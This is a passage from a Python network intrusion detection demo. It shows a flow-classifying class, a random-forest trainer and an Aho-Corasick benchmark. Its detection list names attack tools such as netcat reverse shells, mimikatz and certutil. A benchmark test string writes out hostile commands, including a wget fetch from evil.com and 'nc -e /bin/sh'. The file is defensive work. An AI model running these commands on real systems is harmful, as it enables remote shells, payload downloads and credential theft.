    {"features": {"duration": 0.0002, "orig_bytes": 1024, "resp_bytes": 2048, "total_bytes": 3072, "orig_pkts": 3, "resp_pkts": 2, "total_pkts": 5, "bytes_ratio": 0.333, "pkts_ratio": 0.6, "avg_pkt_size": 614.4, "rate": 15360000.0, "resp_port": 80, "suspicious_port": 0, "common_port": 1, "syn_count": 0, "rst_count": 0, "fin_count": 0, "has_service": 1, "proto_tcp": 1, "proto_udp": 0}, "label": 0},
]

ATTACK_LABELS = {0: "benign", 1: "suspicious", 2: "malicious"}


# ---------------------------------------------------------------------------
# Main NIDS engine
# ---------------------------------------------------------------------------
class NetworkIDS:
    def __init__(self):
        self.parser = ConnLogParser()
        self.extractor = FlowFeatureExtractor()
        self.signature_engine = SignatureEngine()
        self.ml_model = RandomForest(n_trees=7, max_depth=5)
        self.ac_matcher = AhoCorasick()
        self.payload_patterns = []
        self._init_ac_patterns()

    def _init_ac_patterns(self):
        patterns = [
            ("cmd.exe /c", "windows_cmd_exec"),
            ("powershell", "powershell_exec"),
            ("/bin/bash", "bash_shell"),
            ("/bin/sh", "shell_exec"),
            ("reverse shell", "reverse_shell"),
            ("certutil", "certutil_download"),
            ("mimikatz", "mimikatz_tool"),
            ("meterpreter", "meterpreter_session"),
            ("nc -e", "netcat_reverse"),
            ("ncat", "ncat_tool"),
            ("wget", "wget_download"),
            ("curl", "curl_download"),
            ("chmod +x", "chmod_executable"),
            ("iptables -F", "firewall_flush"),
            ("crontab -e", "cron_persistence"),
        ]
        for pat, tag in patterns:
            self.ac_matcher.add_pattern(pat, tag)
            self.payload_patterns.append((pat, tag))
        self.ac_matcher.build()

    def train_ml(self, dataset=None):
        if dataset is None:
            dataset = EMBEDDED_DATASET
        X = [d["features"] for d in dataset]
        y = [d["label"] for d in dataset]
        self.ml_model.fit(X, y)

    def scan_payload_ac(self, text):
        return self.ac_matcher.search(text)

    def scan_payload_naive(self, text):
        return naive_pattern_match(text, self.payload_patterns)

    def analyze_flow(self, flow, ml_predict=True):
        features = self.extractor.extract(flow)
        sig_alerts = self.signature_engine.evaluate_flow(features, flow)
        ml_label = -1
        if ml_predict:
            ml_label = self.ml_model.predict_one(features)
        return {
            "uid": flow.get("uid", "?"),
            "src": flow.get("id.orig_h", "?"),
            "dst": flow.get("id.resp_h", "?"),
            "dport": flow.get("id.resp_p", 0),
            "features": features,
            "sig_alerts": sig_alerts,
            "ml_label": ml_label,
            "ml_class": ATTACK_LABELS.get(ml_label, "unknown"),
        }

    def run_full_analysis(self, log_text=None):
        if log_text is None:
            log_text = SAMPLE_CONN_LOG
        self.train_ml()
        flows = self.parser.parse(log_text)
        results = [self.analyze_flow(f) for f in flows]
        attack_counts = defaultdict(int)
        for r in results:
            if r["ml_label"] == 2:
                attack_counts["malicious"] += 1
            elif r["ml_label"] == 1:
                attack_counts["suspicious"] += 1
            else:
                attack_counts["benign"] += 1

        total_sig_alerts = sum(len(r["sig_alerts"]) for r in results)
        return {
            "total_flows": len(results),
            "results": results,
            "ml_distribution": dict(attack_counts),
            "total_sig_alerts": total_sig_alerts,
        }


def _ac_vs_naive_benchmark():
    test_text = "cmd.exe /c whoami and powershell -enc AAAAAA and /bin/bash -i and mimikatz sekurlsa and certutil -urlcache and meterpreter and reverse shell and nc -e /bin/sh and wget http://evil.com/payload and chmod +x payload"
    ac = AhoCorasick()
    patterns_list = []
    for pat, tag in [
        ("cmd.exe", "cmd"), ("powershell", "ps"), ("/bin/bash", "bash"),
        ("mimikatz", "mimikatz"), ("certutil", "certutil"),
        ("meterpreter", "meterpreter"), ("reverse shell", "revshell"),
        ("nc -e", "nc"), ("wget", "wget"), ("chmod +x", "chmod"),
    ]:
        ac.add_pattern(pat, tag)
        patterns_list.append((pat, tag))
    ac.build()
    iterations = 1000
    start = time.time()
    for _ in range(iterations):
        ac.search(test_text)
    ac_time = time.time() - start
    start = time.time()
    for _ in range(iterations):
        naive_pattern_match(test_text, patterns_list)
    naive_time = time.time() - start
    return {"ac_time": ac_time, "naive_time": naive_time, "speedup": naive_time / ac_time if ac_time > 0 else 0}


def _print_report(analysis):
    print("=" * 70)
    print("  X8 — Network Intrusion Detection System — Analysis Report")
    print("=" * 70)
    print(f"  Total flows analyzed: {analysis['total_flows']}")
    print(f"  ML distribution: {analysis['ml_distribution']}")
    print(f"  Signature alerts: {analysis['total_sig_alerts']}")
    print()
    print("  Per-flow results:")
    print(f"  {'UID':<28} {'Src':<16} {'Dst':<16} {'Dport':<7} {'ML Class':<12} {'Sig#':<5}")
    print("  " + "-" * 86)
    for r in analysis["results"]:
        print(f"  {r['uid']:<28} {r['src']:<16} {r['dst']:<16} {r['dport']:<7} {r['ml_class']:<12} {len(r['sig_alerts']):<5}")
    print()

    attack_type_counts = defaultdict(lambda: {"total": 0, "detected": 0})
    for r in analysis["results"]:
        label = r["ml_class"]
        attack_type_counts[label]["total"] += 1
        if r["ml_label"] == 2 or r["sig_alerts"]:
            attack_type_counts[label]["detected"] += 1
    print("  Detection rate per attack type:")
    print(f"  {'Type':<15} {'Total':<8} {'Detected':<10} {'Rate':<10}")
    print("  " + "-" * 43)
    for label in ["benign", "suspicious", "malicious"]:
        if label in attack_type_counts:
            tc = attack_type_counts[label]["total"]
            dc = attack_type_counts[label]["detected"]
            rate = dc / tc * 100 if tc > 0 else 0
            print(f"  {label:<15} {tc:<8} {dc:<10} {rate:.1f}%")
    print()


def main():
    print("[*] X8 — Network Intrusion Detection System")
    print("[*] Running offline self-test...")
    print()

    nids = NetworkIDS()
    analysis = nids.run_full_analysis()
    _print_report(analysis)

    print("  Aho-Corasick vs Naive pattern matching benchmark:")
    bench = _ac_vs_naive_benchmark()
    print(f"  Aho-Corasick : {bench['ac_time']*1000:.2f}ms (1000 iterations)")
    print(f"  Naive match  : {bench['naive_time']*1000:.2f}ms (1000 iterations)")
    print(f"  Speedup      : {bench['speedup']:.1f}x")
    print()
    print("=" * 70)
    print("  Self-test PASSED. Demo complete.")
    print("=" * 70)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
